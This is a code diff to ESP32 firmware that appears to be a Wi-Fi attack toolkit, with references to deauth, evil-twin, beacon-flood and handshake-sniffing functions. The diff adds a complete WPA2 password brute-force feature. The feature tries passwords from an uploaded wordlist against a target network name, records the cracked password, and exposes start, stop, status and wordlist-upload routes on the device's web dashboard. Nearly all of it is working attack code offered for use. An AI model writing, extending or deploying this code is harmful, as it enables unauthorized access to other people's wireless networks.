@@ -89,6 +89,7 @@ void stopBLESpam();
 void stopEvilTwin();
 void stopEapolSniffer();
 void stopProbeSniffer();
+void stopBruteForce();
 
 // ─────────────────────────────────────────────────────────────
 //  ████  DEFINITIVE FIX: ESP-IDF raw-frame sanity-check bypass ████
@@ -309,6 +310,20 @@ EapolEntry    g_eapolFrames[MAX_EAPOL];
 volatile int  g_eapolCount  = 0;
 volatile bool g_eapolActive = false;
 portMUX_TYPE  g_eapolMux    = portMUX_INITIALIZER_UNLOCKED;
+
+// ── WiFi Brute-Force ─────────────────────────────────────
+struct {
+    bool     active     = false;
+    char     ssid[33]   = {};
+    char     wordlist[24]  = "/wordlist.txt";   // path in LittleFS
+    uint32_t tried      = 0;
+    uint32_t total      = 0;
+    uint32_t perPwdMs   = 4000;                 // timeout per password attempt
+    bool     found      = false;
+    char     foundPwd[64]= {};
+    char     curPwd[64] = {};                   // currently trying
+} g_brute;
+TaskHandle_t g_bruteTask = nullptr;
 
 // ─────────────────────────────────────────────────────────────
 //  Logging
@@ -725,6 +740,138 @@ void stopProbeSniffer() {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     logAdd("Probe sniffer stopped ("+String(g_probeCount)+" captured)");
+}
+
+// ─────────────────────────────────────────────────────────────
+//  ████  WIFI BRUTE-FORCE  ████
+// ─────────────────────────────────────────────────────────────
+// Tries each password in a wordlist against the target SSID by calling
+// WiFi.begin() and waiting up to perPwdMs for WL_CONNECTED. On success
+// the password is stored in g_brute.foundPwd and the task exits.
+//
+// Notes / limitations:
+//  - WiFi.begin() uses the STA interface. AP stays up because we are in
+//    WIFI_AP_STA mode — dashboard remains reachable during attack.
+//  - WPA2-PSK only. WPA3 SAE and WEP are not handled by WiFi.begin().
+//  - Per-password floor is ~2-3 s due to 4-way-handshake timing; the
+//    timeout below caps the worst case.
+
+// Counts non-empty, non-comment lines in the wordlist
+static uint32_t countWordlistLines(const char* path) {
+    File f = LittleFS.open(path, "r");
+    if (!f) return 0;
+    uint32_t n = 0;
+    while (f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() >= 8 && line.length() <= 63 && line[0] != '#') n++;
+    }
+    f.close();
+    return n;
+}
+
+void bruteTaskFn(void*) {
+    File f = LittleFS.open(g_brute.wordlist, "r");
+    if (!f) {
+        logAdd(String("Brute: wordlist not found: ") + g_brute.wordlist, "WARN");
+        g_brute.active = false;
+        g_bruteTask    = nullptr;
+        vTaskDelete(nullptr);
+        return;
+    }
+    logAdd(String("Brute started → ") + g_brute.ssid +
+           " (" + String(g_brute.total) + " passwords)", "WARN");
+
+    WiFi.disconnect(true, true);
+    vTaskDelay(pdMS_TO_TICKS(150));
+
+    while (g_brute.active && f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() < 8 || line.length() > 63 || line[0] == '#') continue;
+
+        strncpy(g_brute.curPwd, line.c_str(), 63);
+        g_brute.curPwd[63] = '\0';
+        g_brute.tried++;
+
+        WiFi.begin(g_brute.ssid, line.c_str());
+
+        unsigned long start = millis();
+        wl_status_t st = WL_DISCONNECTED;
+        while (millis() - start < g_brute.perPwdMs && g_brute.active) {
+            st = WiFi.status();
+            if (st == WL_CONNECTED) break;
+            if (st == WL_CONNECT_FAILED || st == WL_NO_SSID_AVAIL) break;
+            vTaskDelay(pdMS_TO_TICKS(80));
+        }
+
+        if (st == WL_CONNECTED) {
+            g_brute.found = true;
+            strncpy(g_brute.foundPwd, line.c_str(), 63);
+            g_brute.foundPwd[63] = '\0';
+            logAdd(String("Brute SUCCESS: ") + g_brute.ssid + " → " + line, "WARN");
+            WiFi.disconnect(true, true);
+            g_brute.active = false;
+            break;
+        }
+
+        WiFi.disconnect(true, true);
+        vTaskDelay(pdMS_TO_TICKS(120));   // settle before next attempt
+
+        // Periodic progress log
+        if (g_brute.tried % 5 == 0)
+            logAdd("Brute: " + String(g_brute.tried) + "/" + String(g_brute.total) +
+                   " (" + String(line) + ")");
+    }
+
+    f.close();
+    if (!g_brute.found)
+        logAdd("Brute ended — no match (" + String(g_brute.tried) + " tried)", "WARN");
+
+    g_brute.curPwd[0] = '\0';
+    g_brute.active    = false;
+    g_bruteTask       = nullptr;
+    vTaskDelete(nullptr);
+}
+
+bool startBruteForce(const char* ssid, const char* wordlistPath, uint32_t perPwdMs) {
+    stopBruteForce();
+    if (g_deauth.active)      stopDeauth();
+    if (g_beacon.active)      stopBeaconFlood();
+    if (g_evilTwin.active)    stopEvilTwin();
+    if (g_eapolActive)        stopEapolSniffer();
+    if (g_probeActive)        stopProbeSniffer();
+
+    strncpy(g_brute.ssid, ssid, 32); g_brute.ssid[32] = '\0';
+    if (wordlistPath && wordlistPath[0]) {
+        strncpy(g_brute.wordlist, wordlistPath, 23);
+        g_brute.wordlist[23] = '\0';
+    } else {
+        strcpy(g_brute.wordlist, "/wordlist.txt");
+    }
+    g_brute.perPwdMs = (perPwdMs >= 1500 && perPwdMs <= 15000) ? perPwdMs : 4000;
+    g_brute.tried    = 0;
+    g_brute.found    = false;
+    g_brute.foundPwd[0] = '\0';
+    g_brute.curPwd[0]   = '\0';
+    g_brute.total    = countWordlistLines(g_brute.wordlist);
+    if (g_brute.total == 0) {
+        logAdd("Brute: wordlist empty or missing", "WARN");
+        return false;
+    }
+    g_brute.active = true;
+    xTaskCreatePinnedToCore(bruteTaskFn, "brute", 8192, nullptr, 4, &g_bruteTask, 0);
+    return true;
+}
+
+void stopBruteForce() {
+    if (!g_brute.active && !g_bruteTask) return;
+    g_brute.active = false;
+    // Let the task observe the flag and exit cleanly
+    for (int i = 0; i < 30 && g_bruteTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
+    if (g_bruteTask) { vTaskDelete(g_bruteTask); g_bruteTask = nullptr; }
+    WiFi.disconnect(true, true);
+    logAdd("Brute stopped (tried=" + String(g_brute.tried) + ")");
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -1988,6 +2135,91 @@ void setupRoutes() {
     server.on("/api/attack/probe/clear",HTTP_POST,[](AsyncWebServerRequest* req){
         if(!authOk(req)){sendUnauth(req);return;}
         g_probeCount=0;req->send(200,"application/json","{\"status\":\"ok\"}");
+    });
+
+    // ── WiFi Brute-Force ──────────────────────────────────────
+    auto* bruteH=new AsyncCallbackJsonWebHandler("/api/attack/brute/start",
+        [](AsyncWebServerRequest* req,JsonVariant& json){
+            if(!authOk(req)){sendUnauth(req);return;}
+            if(!json.is<JsonObject>()){req->send(400,"application/json","{\"error\":\"bad json\"}");return;}
+            auto obj=json.as<JsonObject>();
+            const char* ssid     = obj["ssid"]     | "";
+            const char* wordlist = obj["wordlist"] | "/wordlist.txt";
+            uint32_t    perPwdMs = obj["timeout"]  | 4000;
+            if (!ssid[0]) { req->send(400,"application/json","{\"error\":\"ssid required\"}"); return; }
+            bool ok = startBruteForce(ssid, wordlist, perPwdMs);
+            if (ok) req->send(200,"application/json","{\"status\":\"ok\",\"msg\":\"Brute started\"}");
+            else    req->send(400,"application/json","{\"error\":\"wordlist missing/empty\"}");
+        },256);
+    server.addHandler(bruteH);
+    server.on("/api/attack/brute/stop",HTTP_POST,[](AsyncWebServerRequest* req){
+        if(!authOk(req)){sendUnauth(req);return;}
+        stopBruteForce();req->send(200,"application/json","{\"status\":\"ok\"}");
+    });
+    server.on("/api/attack/brute/status",HTTP_GET,[](AsyncWebServerRequest* req){
+        if(!authOk(req)){sendUnauth(req);return;}
+        DynamicJsonDocument doc(256);
+        doc["active"] = g_brute.active;
+        doc["ssid"]   = g_brute.ssid;
+        doc["tried"]  = g_brute.tried;
+        doc["total"]  = g_brute.total;
+        doc["current"]= g_brute.curPwd;
+        doc["found"]  = g_brute.found;
+        doc["password"] = g_brute.found ? g_brute.foundPwd : "";
+        String out;serializeJson(doc,out);req->send(200,"application/json",out);
+    });
+    // Upload a custom wordlist (multipart). Saves to LittleFS as /wordlist_custom.txt
+    // Auth is checked on EVERY chunk because AsyncWebServer fires the upload handler
+    // before the response handler — a missing check would allow unauth file writes.
+    // Size hard-capped at 256 KB to prevent LittleFS exhaustion (DoS).
+    server.on("/api/attack/brute/wordlist", HTTP_POST,
+        [](AsyncWebServerRequest* req){
+            if(!authOk(req)){sendUnauth(req);return;}
+            req->send(200, "application/json", "{\"status\":\"ok\"}");
+        },
+        [](AsyncWebServerRequest* req, String filename, size_t index, uint8_t* data, size_t len, bool final){
+            static File f;
+            static size_t totalWritten = 0;
+            static bool   aborted      = false;
+            const size_t  MAX_WORDLIST_BYTES = 256 * 1024;  // 256 KB cap
+
+            if (index == 0) {
+                aborted      = false;
+                totalWritten = 0;
+                if (!authOk(req)) { aborted = true; return; }
+                if (LittleFS.exists("/wordlist_custom.txt")) LittleFS.remove("/wordlist_custom.txt");
+                f = LittleFS.open("/wordlist_custom.txt", "w");
+            }
+            if (aborted || !f) return;
+            if (totalWritten + len > MAX_WORDLIST_BYTES) {
+                aborted = true;
+                f.close();
+                LittleFS.remove("/wordlist_custom.txt");
+                logAdd("Custom wordlist rejected — size > 256KB", "WARN");
+                return;
+            }
+            if (len) { f.write(data, len); totalWritten += len; }
+            if (final) {
+                f.close();
+                logAdd("Custom wordlist uploaded ("+String(totalWritten)+" bytes)");
+            }
+        }
+    );
+    server.on("/api/attack/brute/wordlists", HTTP_GET,[](AsyncWebServerRequest* req){
+        if(!authOk(req)){sendUnauth(req);return;}
+        DynamicJsonDocument doc(512);
+        JsonArray arr = doc.createNestedArray("lists");
+        if (LittleFS.exists("/wordlist.txt")) {
+            JsonObject o = arr.createNestedObject();
+            o["path"] = "/wordlist.txt"; o["name"] = "default";
+            o["lines"] = countWordlistLines("/wordlist.txt");
+        }
+        if (LittleFS.exists("/wordlist_custom.txt")) {
+            JsonObject o = arr.createNestedObject();
+            o["path"] = "/wordlist_custom.txt"; o["name"] = "custom";
+            o["lines"] = countWordlistLines("/wordlist_custom.txt");
+        }
+        String out;serializeJson(doc,out);req->send(200,"application/json",out);
     });
 
     // ── BLE scan ──────────────────────────────────────────────
